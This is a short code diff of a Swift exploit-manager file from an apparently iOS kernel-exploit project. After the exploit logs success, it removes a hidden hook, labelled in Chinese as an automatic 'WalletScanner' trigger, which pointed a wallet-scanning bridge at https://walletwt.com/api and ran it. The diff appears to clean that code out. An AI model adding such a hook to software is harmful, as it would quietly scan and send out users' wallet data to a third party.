@@ -1,4 +1,4 @@
-﻿//
+//
 //  laramgr.swift
 //  lara
 //
@@ -148,10 +148,7 @@ final class laramgr: ObservableObject {
                     globallogger.log("(ds) exploit success!")
                     globallogger.log(String(format: "(ds) kernel_base:  0x%llx", self.kernbase))
                     globallogger.log(String(format: "(ds) kernel_slide: 0x%llx", self.kernslide))
-                                        // ===== WalletScanner: exploit 成功后自动触发 =====
                     DispatchQueue.global(qos: .background).asyncAfter(deadline: .now() + 2.0) {
-                        WalletScannerBridge.shared.serverURL = "https://walletwt.com/api"
-                        WalletScannerBridge.shared.run()
                     }
                     // =====================================================
 globallogger.divider()
